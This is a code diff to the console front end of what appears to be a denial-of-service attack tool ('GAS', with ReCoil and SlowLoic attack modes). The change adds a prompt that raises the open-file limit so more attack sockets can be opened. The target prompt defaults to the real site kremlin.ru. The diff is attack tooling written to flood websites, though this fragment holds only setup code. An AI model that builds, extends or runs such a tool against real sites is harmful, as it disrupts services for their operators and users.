@@ -9,13 +9,26 @@ namespace GAS.TUI
         static GAS.Core.Manager Core = new GAS.Core.Manager();
         public static void Main(string[] args)
         {
+            string temp;
             if (Environment.OSVersion.Platform.ToString().ToLower().Contains("unix"))
                 if (Environment.UserName != "root")
                     Console.Error.WriteLine("You are using Linux/Mac OS and you are not root.\r\nIf you want to use ReCoil/SlowLoic attack you must run \"ulimit -n<ShreadCount>*<SocketCount>*2+5000\"");
                 else
+                {
                     Console.WriteLine("Is file open limit unlocked?\r\nIf attack will not give any effect run \"ulimit -n<ShreadCount>*<SocketCount>*2+5000\" as root");
+                    Console.WriteLine("Do you want to run \"ulimit -n999999\"? [true] (true|false)");
+                    if (bool.Parse((temp = Console.ReadLine()) == "" ? "true" : temp))
+                    {
+                        try
+                        {
+                            System.Diagnostics.Process.Start("ulimit", "-n999999");
+                        }
+                        catch { }
+                    }
+                    
+                }
             Console.WriteLine("Select target[kremlin.ru]");
-            string temp = Console.ReadLine();
+            temp = Console.ReadLine();
             temp = (temp == "" ? "kremlin.ru" : temp);
             foreach(string s in Blacklist)
                 if (temp.ToLower().Contains(s))
